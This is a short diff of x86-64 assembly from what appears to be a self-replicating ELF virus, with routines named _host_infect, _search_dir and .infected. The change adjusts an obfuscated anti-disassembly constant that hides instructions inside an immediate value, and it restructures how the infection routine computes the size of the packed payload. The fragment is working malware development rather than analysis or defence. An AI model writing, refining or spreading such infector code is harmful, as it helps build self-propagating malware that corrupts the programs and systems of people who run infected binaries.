@@ -102,7 +102,7 @@ _h3ll0w0rld:
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
 	.ft_juggling:
-	mov rax, 0xc0314822eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+	mov rax, 0xc031482aeb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
 	.sneakyboi:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -115,6 +115,10 @@ _h3ll0w0rld:
 	syscall
 	cmp rax, 0x0
 	jnz _exit
+
+	call _get_size_pack
+	push rax
+	pop r8
 
 	; host part
 	call _search_dir
@@ -1047,7 +1051,8 @@ _eof:
 ; TODO: mix _get_size_pack / host_infect to do only 1 _pack --> FASTEEER
 _host_infect:
 	push rdi
-	call _get_size_pack
+;	call _get_size_pack
+	mov rax, r8
 	lea r9, [rel _params]
 	lea rdi, [rel _pack_start]
 	sub rdi, r9
